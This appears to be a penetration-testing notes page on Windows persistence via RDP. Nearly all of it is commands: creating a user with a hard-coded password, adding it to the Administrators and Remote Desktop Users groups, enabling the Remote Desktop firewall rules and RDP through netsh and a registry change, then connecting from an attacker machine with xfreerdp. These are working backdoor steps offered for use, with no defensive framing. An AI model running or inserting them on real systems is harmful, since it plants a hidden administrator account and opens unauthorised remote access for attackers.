# Persistence Techniques



### Gaining persistence via RDP

We add a user using the `net user` utility.&#x20;

```
net user FValkyrie_17 Test@1234 /add
net localgroup administrators FValkyrie_17 /add
net localgroup "Remote Desktop Users" FValkyrie_17 /add
```

In case you forget setting a password, you can set it as follows:

```
net user FValkyrie_17 Test@1234
```

Disable firewall rules using:

```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

And enable RDP using:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption><p>Enabling RDP</p></figcaption></figure>

Now on the attacker machine, we can RDP into the target using `xfreerdp` tool.

```
xfreerdp /u:FValkyrie_17 /p:Test@1234 /v:10.10.10.95
```
